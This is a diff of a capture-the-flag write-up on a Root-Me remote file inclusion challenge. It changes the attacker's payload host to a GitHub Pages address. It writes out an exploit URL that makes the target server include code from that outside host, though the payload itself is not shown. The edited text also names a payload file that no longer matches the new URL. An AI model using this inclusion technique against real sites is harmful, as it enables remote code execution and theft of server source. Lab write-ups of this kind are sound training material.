@@ -52,13 +52,15 @@ For now, I think this is enough to go into the strategy part.
 
 We know that this is vulnerable to RFI. Because our target is not in the internal network but in the public instead, we need a webserver that can be publicly accessible in order to exploit the vulnerability. The idea is to make our target’s server include our malicious code from our web server. That is why we need a publicly accessible web server in order to exploit the vulnerability.
 
-In this case, I will be using free hosting provided by the [WebHost](https://www.000webhost.com/).
+In this case, I will be using free hosting provided by Github Pages.
 
 So the idea is, we will put a full path to my site on the “lang” URL parameter. for example,
 
-http://challenge01.root-me.org/web-serveur/ch13/?lang=[https://kopikulogojek.000webhostapp.com/m](https://kopikulogojek.000webhostapp.com/rootme-rfi-exploit)yexploit.php
+http://challenge01.root-me.org/web-serveur/ch13/?lang=https://h4ckrati.github.io/rfi-test/exploit
 
-where [_https://kopikulogojek.000webhostapp.com/_](https://kopikulogojek.000webhostapp.com/rootme-rfi-exploit) is the URL of my web server and the _myexploit.php_ is the payload.
+where https://h4ckrati.github.io/rfi-test/exploit is the URL of my web server and the _myexploit.php_ is the payload which contains that :
+
+
 
 Now talking about the payload, our goal is to get the PHP source code. This can be done in at least 2 ways:
 
